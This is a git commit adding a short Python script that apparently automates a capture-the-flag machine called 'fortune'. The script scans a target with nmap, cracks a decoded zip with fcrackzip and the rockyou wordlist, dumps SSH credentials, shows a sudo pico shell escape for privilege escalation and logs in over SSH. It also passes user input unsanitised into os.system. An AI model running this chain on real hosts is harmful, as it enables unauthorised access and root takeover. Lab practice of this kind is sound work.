b4559343b738e3482d1b9120da7350de57f13473
BlackBloodhacker <120245401+BlackBloodhacker@users.noreply.github.com>
2022-12-10 14:06:07 +0530

    Add files via upload

---
+++ fortune.py
@@ -0,0 +1,31 @@
+#!/usr/bin/python
+
+import os
+class root:
+    OKGREEN = '\033[92m'
+    END = '\033[0m'
+
+ip = input("Enter Your fortune IP: ")
+os.system(f'nmap -sV -sC {ip}')
+
+ba64 = input("Enter The base64 code showing in nmap scan(remove spaces from the code): ")
+os.system(f'echo {ba64} | base64 -d > decode.zip;fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt decode.zip;unzip decode.zip')
+os.system('clear')
+print(f"{root.OKGREEN}SSH LOGIN PASSWORD FOUND!{root.END}")
+os.system('cat creds.txt')
+
+print("--------------------------------")
+
+print('''
+    privilege escalation
+|------------------------|
+|  sudo pico             |
+|  ^R^X                  |
+|  reset; sh 1>&0 2>&0   |
+--------------------------''')
+
+os.system(f'ssh fortune@{ip}')
+os.system('whomai')
+
+#rootpiebot :)
+
